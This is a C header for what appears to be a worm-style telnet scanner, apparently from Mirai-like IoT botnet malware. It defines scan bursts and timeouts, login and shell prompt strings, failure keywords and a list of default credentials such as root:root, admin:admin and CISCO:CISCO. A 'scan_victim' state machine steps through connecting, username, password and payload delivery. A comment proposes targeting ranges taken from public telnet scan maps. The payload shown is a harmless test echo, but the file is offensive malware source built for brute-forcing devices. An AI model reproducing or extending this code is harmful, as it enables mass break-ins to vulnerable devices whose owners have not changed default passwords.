#pragma once

#define SCANNER_TEST TRUE // Scanner test mode
#define SCAN_SCANNER_BURST 200 // How many packets to send out each burst
#define SCAN_SCANNER_MAXCON 10 // Maximum connections white bruteforcing
#define SCAN_SCANNER_TIMEOUT_SEC 5 // Scanner send and recv timeout in seconds
#define SCAN_SCANNER_TIMEOUT_USEC 0 // Scanner send and recv timeout in useconds
#define SCAN_SCANNER_STIMEOUT_SEC 1 // Scanner select timeout in seconds
#define SCAN_SCANNER_STIMEOUT_USEC 0 // Scanner select timeout in useconds
#define SCAN_SCANNER_PAYLOAD "echo Hello World!\r\n\0"

#ifdef SCANNER_TEST
#ifndef DEBUG
#error Including SCANNER_TEST in a non DEBUG build
#endif
#endif

#define usersize (sizeof(usernames) / sizeof(unsigned char *))
#define passsize (sizeof(passwords) / sizeof(unsigned char *))

const static char *userprompts[] =
{
	"user\0",
	"login\0",
	NULL,
};

const static char *passprompts[] =
{
	"password\0",
	NULL
};

const static char *prompts[] =
{
	"$\0",
	"#\0",
	NULL
};

const static char *failstrs[] =
{
	"invalid",
	"incorrect",
	"fail",
	"again",
	"wrong",
	"denied",
	"error",
	"bad",
	NULL
};

const static char *usernames[] =
{
	"root\r\n\0", // root:root
	"root\r\n\0", // root:1234
	"root\r\n\0", // root:12345
	"admin\r\n\0", // admin:admin
	"telnet\r\n\0", // telnet:telnet
	"CISCO\r\n\0", // CISCO:CISCO
};

const static char *passwords[] =
{
	"root\r\n\0", // root:root
	"1234\r\n\0", // root:1234
	"12345\r\n\0", // root:12345
	"admin\r\n\0", // admin:admin
	"telnet\r\n\0", // telnet:telnet
	"CISCO\r\n\0"
};


/*
https://telnetscan.shadowserver.org/
https://telnetscan.shadowserver.org/all/telnet_hilbert_1024_current.png
Good ranges?

static char *ranges[] =
{
	// Add these bitch
};
*/

struct scan_victim
{
	ipv4_t ip;
	enum
	{
		CONNECTING,
		SELECT,
		USERNAME,
		PASSWORD,
		PAYLOAD,
		FINISHED,
		END,
	} state;
	int32_t sock;
	uint8_t user;
	uint8_t pass;
	uint8_t tries;
};

void scan_init();
bool scan_scanner();
